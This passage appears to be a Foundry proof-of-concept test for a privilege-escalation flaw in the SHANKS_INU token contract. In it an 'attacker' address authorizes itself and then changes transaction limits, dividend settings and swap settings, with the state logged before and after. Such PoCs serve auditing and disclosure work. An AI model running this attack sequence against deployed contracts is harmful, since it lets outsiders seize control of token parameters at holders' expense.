    SHANKS_INU token;

    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant MOCK_FACTORY = 0x1111111111111111111111111111111111111111;

    address owner = address(0x123);
    address attacker = address(0x456);
    address user = address(0x789);
    address constant presaler = address(0x410876C017bab6C4C9c595c34F6F21648847BEeD);

    function setUp() public {
        // Deploy and setup mock contracts at fixed addresses
        MockFactory mockFactory = new MockFactory();
        MockRouter mockRouter = new MockRouter();

        vm.etch(MOCK_FACTORY, address(mockFactory).code);
        vm.etch(PANCAKE_ROUTER, address(mockRouter).code);

        // Deploy token contract
        token = new SHANKS_INU();

        // Transfer ownership to test owner
        token.transferOwnership(payable(owner));
    }

    function testPrivilegeEscalation() public {
        // Query initial state BEFORE attack
        console.log("--- BEFORE-Trigger State ---");
        uint256 maxTxAmountBefore = token._maxTxAmount();
        IDividendDistributor distributorBefore = IDividendDistributor(token.distributor());
        uint256 minPeriodBefore = distributorBefore.minPeriod();
        uint256 minDistributionBefore = distributorBefore.minDistribution();
        bool swapEnabledBefore = token.swapEnabled();

        console.log("Initial maxTxAmount: %s", maxTxAmountBefore);
        console.log("Initial minPeriod: %s", minPeriodBefore);
        console.log("Initial minDistribution: %s", minDistributionBefore);
        console.log("Initial swapEnabled: %s", swapEnabledBefore);

        // Exploit triggering actions
        console.log("--- TRIGGERING Attacker Actions ---");
        vm.startPrank(attacker);
        token.authorize(attacker);
        uint256 minTxLimit = token.totalSupply() / 10000;
        token.setTxLimit(minTxLimit);
        token.setDistributionCriteria(0, 0);
        token.setSwapBackSettings(false, 100);
        vm.stopPrank();

        // Attempt transfer that should fail (original PoC check)
        vm.prank(attacker);
        vm.expectRevert();
        token.transfer(user, minTxLimit + 1);

        // Query final state AFTER attack
        console.log("--- AFTER-Trigger State ---");
        uint256 maxTxAmountAfter = token._maxTxAmount();
        IDividendDistributor distributorAfter = IDividendDistributor(token.distributor());
        uint256 minPeriodAfter = distributorAfter.minPeriod();
        uint256 minDistributionAfter = distributorAfter.minDistribution();
        bool swapEnabledAfter = token.swapEnabled();

        console.log("Final maxTxAmount: %s", maxTxAmountAfter);
        console.log("Final minPeriod: %s", minPeriodAfter);
        console.log("Final minDistribution: %s", minDistributionAfter);
        console.log("Final swapEnabled: %s", swapEnabledAfter);

        // Verify changes
        uint256 expectedMaxTx = token.totalSupply() / 10000;
        bool maxTxChanged = (maxTxAmountAfter == expectedMaxTx);
        bool minPeriodChanged = (minPeriodAfter == 0);
        bool minDistChanged = (minDistributionAfter == 0);
        bool swapDisabled = (swapEnabledAfter == false);

        console.log("Changes Detected:");
        console.log("- maxTxAmount changed: %s", maxTxChanged);
        console.log("- minPeriod cleared: %s", minPeriodChanged);
        console.log("- minDistribution cleared: %s", minDistChanged);
        console.log("- swap disabled: %s", swapDisabled);

        // Vulnerability determination
        bool vulnerabilityExists = maxTxChanged || minPeriodChanged || minDistChanged || swapDisabled;

        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Attacker successfully modified critical state variables");
        } else {
            console.log("Vulnerability not Exist: No critical state modifications detected");
        }
    }
}
